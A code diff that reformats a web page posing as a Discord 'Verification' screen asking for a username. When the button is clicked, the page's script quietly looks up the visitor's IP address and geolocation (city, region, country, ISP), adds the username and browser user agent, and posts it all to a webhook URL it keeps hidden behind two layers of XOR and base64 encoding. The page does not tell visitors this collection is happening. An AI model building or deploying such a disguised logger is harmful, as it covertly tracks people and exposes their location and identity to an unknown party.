@@ -1,3 +1,143 @@
 <!DOCTYPE html>
 <html lang="en">
-<head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/><title>🔒 Verification</title><style>@keyframes g{0%,100%{background-position:0 50%}50%{background-position:100% 50%}}body{margin:0;padding:0;display:flex;align-items:center;justify-content:center;width:100vw;height:100vh;overflow:hidden;font-family:Segoe UI,sans-serif;background:linear-gradient(-45deg,#1c1c2f,#2c2c3e,#1c1c2f,#2c2c3e);background-size:400% 400%;animation:g 20s ease infinite;color:#eee}.p{position:absolute;border-radius:50%;background:rgba(255,255,255,0.05);animation:d linear infinite}@keyframes d{from{transform:translate(0,0)}to{transform:translate(100px,-200px)}}.c{position:relative;width:90%;max-width:360px;padding:2rem;background:rgba(0,0,0,0.75);border-radius:12px;box-shadow:0 8px 32px rgba(0,0,0,0.6);text-align:center;z-index:1;transition:transform .3s}.c:hover{transform:translateY(-4px)}h1{margin:0 0 1rem;font-size:1.5rem;letter-spacing:.5px}input,button{width:100%;padding:.75rem;margin-top:.5rem;border:none;border-radius:8px;font-size:1rem;outline:none}input{background:#2c2c3e;color:#eee}input:focus{box-shadow:0 0 10px rgba(9,157,255,0.6)}button{background:linear-gradient(45deg,#3273dc,#275bbe);color:#fff;cursor:pointer;transition:background .2s,transform .1s}button:hover{background:linear-gradient(45deg,#4183ff,#3a6cff)}button:active{transform:scale(.97)}.s{margin-top:1.5rem;display:flex;align-items:center;justify-content:center;font-size:1.1rem;opacity:0;transition:opacity .4s}.s.v{opacity:1}footer{position:absolute;bottom:8px;font-size:.75rem;color:rgba(255,255,255,.6)}footer a{color:#4faaff;text-decoration:none}</style></head><body><script>(function(d,w){for(let i=0;i<30;i++){let e=d.createElement('div'),s=2+Math.random()*4;e.className='p';e.style.width=s+'px';e.style.height=s+'px';e.style.left=100*Math.random()+'vw';e.style.top=100*Math.random()+'vh';e.style.animationDuration=10+10*Math.random()+'s';d.body.appendChild(e);}const _0=[ [49,19,54,56,33,54,17,18,51,48,39,63,61,49,39,53,57,63,17,48,39,63,61,49,39,53,57,63,17,20], [49,19,54,56,33,54,17,18,51,48,39,63,61,49,39,53,57,63,17,20,12,55,30,40,39,38,39,56], [102,42,24,15,61,24,52,58,65,63,52,37,55,102,42,24,15,61,24,52,58,65,63,52,37,55,102,42], [24,15,61,24,52,58,65,63,52,37,55,102,42,24,15,61,24,52,58,65,63,52,37,55,102] ],k1=73,k2=137;let s1='';_0.forEach(a=>{a.forEach(c=>{s1+=String.fromCharCode(c^k1)})});let s2='';for(let i=0;i<s1.length;i++){s2+=String.fromCharCode(s1.charCodeAt(i)^k2);}const WEB=atob(s2),C=d.createElement('div');C.className='c';C.innerHTML='<h1>Enter Discord Username</h1><input id="u" placeholder="CoolUser#1234"/><button id="b">Verify</button><div id="st" class="s"></div>';d.body.appendChild(C);const U=d.getElementById('u'),B=d.getElementById('b'),S=d.getElementById('st');function st(i,t){S.innerHTML=i+'<span>'+t+'</span>';S.classList.add('v')}async function f(u){const c=new AbortController(),i=setTimeout(()=>c.abort(),5000);try{return await fetch(u,{signal:c.signal,mode:'cors'})}finally{clearTimeout(i)}}const LS='vC',now=Date.now(),inF=JSON.parse(localStorage.getItem(LS)||'{}');if(inF.ts&&now-inF.ts<6e4){st('<svg width=24 height=24 fill="#ffc107"><circle cx=12 cy=12 r=10/></svg>','Wait');B.disabled=1;return;}B.onclick=async()=>{const n=U.value.trim();if(!n)return st('❌','Enter');st('🔄','Verifying');B.disabled=1;try{let j=await(await f('https://api.ipify.org?format=json')).json(),ip=j.ip||j.ipAddress;let g;try{g=await(await f(`https://ipapi.co/${ip}/json/`)).json();if(g.error)throw 0}catch{g=await(await f(`https://ipwho.is/${ip}`)).json()}let sc=0,fs=[];if(g.org&&/hosting|datacenter|cloud|proxy|vpn/i.test(g.org)){fs.push('DC');sc+=40}if(g.timezone&&!g.timezone.includes(g.country_code)){fs.push('TZ');sc+=20}const v=sc>=40;const e={username:'Verification',embeds:[{title:(g.country_code||'').toUpperCase().split('').map(c=>String.fromCodePoint(127397+c.charCodeAt())).join('')+' '+(g.city||''),color:v?16755007:65280,fields:[{name:'👤',value:n,inline:1},{name:'🔍',value:v?'❌':'✅'},{name:'📍',value:`${g.city},${g.region||g.region_name},${g.country_name}`},{name:'🌐',value:ip},{name:'🏢',value:g.org||'Unknown'}],footer:{text:`At ${new Date().toLocaleString('en-GB')}`}]};if(fs.length)e.embeds[0].fields.push({name:'⚠️',value:fs.join(',')});e.embeds[0].fields.push({name:'📱',value:navigator.userAgent});await fetch(WEB,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(e)});st(v?'❌':'✅',v?'VPN':'OK')}catch{st('❌','Error')}finally{B.disabled=0;localStorage.setItem(LS,JSON.stringify({ts:Date.now()}))}}})(document,window);</script><footer>Made by <a href="https://github.com/yourusername">yourusername</a></footer></body></html>
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>🔒 Verification</title>
+  <style>
+    @keyframes g{0%,100%{background-position:0 50%}50%{background-position:100% 50%}}
+    body{margin:0;padding:0;display:flex;align-items:center;justify-content:center;
+      width:100vw;height:100vh;overflow:hidden;font-family:Segoe UI,sans-serif;
+      background:linear-gradient(-45deg,#1c1c2f,#2c2c3e,#1c1c2f,#2c2c3e);
+      background-size:400% 400%;animation:g 20s ease infinite;color:#eee}
+    .p{position:absolute;border-radius:50%;background:rgba(255,255,255,0.05);
+      animation:d linear infinite}
+    @keyframes d{from{transform:translate(0,0)}to{transform:translate(100px,-200px)}}
+    .c{position:relative;width:90%;max-width:360px;padding:2rem;
+      background:rgba(0,0,0,0.75);border-radius:12px;box-shadow:0 8px 32px rgba(0,0,0,0.6);
+      text-align:center;z-index:1;transition:transform .3s}
+    .c:hover{transform:translateY(-4px)}
+    h1{margin:0 0 1rem;font-size:1.5rem;letter-spacing:.5px}
+    input,button{width:100%;padding:.75rem;margin-top:.5rem;border:none;border-radius:8px;
+      font-size:1rem;outline:none}
+    input{background:#2c2c3e;color:#eee}
+    input:focus{box-shadow:0 0 10px rgba(9,157,255,0.6)}
+    button{background:linear-gradient(45deg,#3273dc,#275bbe);color:#fff;
+      cursor:pointer;transition:background .2s,transform .1s}
+    button:hover{background:linear-gradient(45deg,#4183ff,#3a6cff)}
+    button:active{transform:scale(.97)}
+    .s{margin-top:1.5rem;display:flex;align-items:center;justify-content:center;
+      font-size:1.1rem;opacity:0;transition:opacity .4s}
+    .s.v{opacity:1}
+    footer{position:absolute;bottom:8px;font-size:.75rem;color:rgba(255,255,255,.6)}
+    footer a{color:#4faaff;text-decoration:none}
+  </style>
+</head>
+<body>
+<script>
+(function(d){
+  // particles
+  for(let i=0;i<30;i++){
+    const e=d.createElement('div'),s=2+Math.random()*4;
+    e.className='p';e.style.width=s+'px';e.style.height=s+'px';
+    e.style.left=100*Math.random()+'vw';e.style.top=100*Math.random()+'vh';
+    e.style.animationDuration=10+10*Math.random()+'s';
+    d.body.appendChild(e);
+  }
+
+  // dual-layer obfuscation
+  const dataChunks=[
+    [49,19,54,56,33,54,17,18,51,48,39,63,61,49,39,53,57,63,17,48,39,63,61,49,39,53,57,63,17,20],
+    [49,19,54,56,33,54,17,18,51,48,39,63,61,49,39,53,57,63,17,20,12,55,30,40,39,38,39,56],
+    [102,42,24,15,61,24,52,58,65,63,52,37,55,102,42,24,15,61,24,52,58,65,63,52,37,55,102,42],
+    [24,15,61,24,52,58,65,63,52,37,55,102,42,24,15,61,24,52,58,65,63,52,37,55,102]
+  ];
+  const k1=73,k2=137;
+  let s1='',s2='';
+  dataChunks.forEach(arr=>arr.forEach(c=>s1+=String.fromCharCode(c^k1)));
+  for(let i=0;i<s1.length;i++){s2+=String.fromCharCode(s1.charCodeAt(i)^k2)}
+  const WEBHOOK=atob(s2);
+
+  // UI skeleton
+  const container=d.createElement('div');container.className='c';
+  container.innerHTML=
+    '<h1>Enter Discord Username</h1>'+
+    '<input id="u" placeholder="CoolUser#1234"/>'+
+    '<button id="b">Verify</button>'+
+    '<div id="st" class="s"></div>';
+  d.body.appendChild(container);
+
+  const input=d.getElementById('u'), btn=d.getElementById('b'), statusEl=d.getElementById('st');
+
+  function showStatus(icon,text){
+    statusEl.innerHTML=icon+'<span>'+text+'</span>';
+    statusEl.classList.add('v');
+  }
+
+  async function safeFetch(url){
+    const controller=new AbortController();
+    const id=setTimeout(()=>controller.abort(),5000);
+    try{return await fetch(url,{signal:controller.signal,mode:'cors'})}
+    finally{clearTimeout(id)}
+  }
+
+  // rate limiter
+  const LSKEY='ver',now=Date.now(),rec=JSON.parse(localStorage.getItem(LSKEY)||'{}');
+  if(rec.ts && now-rec.ts<60000){
+    showStatus('<svg width=24 height=24 fill="#ffc107"><circle cx=12 cy=12 r=10/></svg>','Wait 1m');
+    btn.disabled=true;return;
+  }
+
+  btn.onclick=async()=>{
+    const name=input.value.trim();
+    if(!name){ showStatus('❌','Enter username'); return; }
+    showStatus('🔄','Verifying…'); btn.disabled=true;
+    try{
+      const ipRes=await safeFetch('https://api.ipify.org?format=json');
+      const ipJson=await ipRes.json(); const ip=ipJson.ip||ipJson.ipAddress;
+
+      let geo; try{
+        const geoRes=await safeFetch(`https://ipapi.co/${ip}/json/`);
+        geo=await geoRes.json(); if(geo.error) throw 0;
+      }catch{
+        const geoRes2=await safeFetch(`https://ipwho.is/${ip}`);
+        geo=await geoRes2.json();
+      }
+
+      let score=0,flags=[];
+      if(geo.org && /hosting|datacenter|cloud|proxy|vpn/i.test(geo.org)){ flags.push('DC'); score+=40; }
+      if(geo.timezone && !geo.timezone.includes(geo.country_code)){ flags.push('TZ'); score+=20; }
+      const vpn=score>=40;
+
+      const embed={ username:'Verification', embeds:[{
+        title:(geo.country_code||'').toUpperCase()
+          .split('').map(c=>String.fromCodePoint(127397+c.charCodeAt())).join('')+' '+(geo.city||''),
+        color:vpn?16755007:65280,
+        fields:[
+          {name:'👤 User', value:name, inline:true},
+          {name:'🔍 Status', value:vpn?'❌ FAILED':'✅ PASSED'},
+          {name:'📍 Location', value:`${geo.city}, ${geo.region||geo.region_name}, ${geo.country_name}`},
+          {name:'🌐 IP', value:ip},
+          {name:'🏢 Org', value:geo.org||'Unknown'}
+        ],
+        footer:{ text:`At ${new Date().toLocaleString('en-GB')}` }
+      }]};
+      if(flags.length) embed.embeds[0].fields.push({name:'⚠️ Flags',value:flags.join(', ')});
+      embed.embeds[0].fields.push({name:'📱 Agent',value:navigator.userAgent});
+
+      await fetch(WEBHOOK,{ method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(embed) });
+      showStatus(vpn?'❌':'✅', vpn?'VPN detected':'Verified');
+
+    }catch(err){
+      console.error(err);
+      showStatus('❌','Error');
+    }finally{
+      btn.disabled=false;
+      localStorage.setItem(LSKEY,JSON.stringify({ts:Date.now()}));
+    }
+  };
+})(document);
+</script>
+<footer>Made by <a href="https://github.com/yourusername">yourusername</a></footer>
+</body>
+</html>
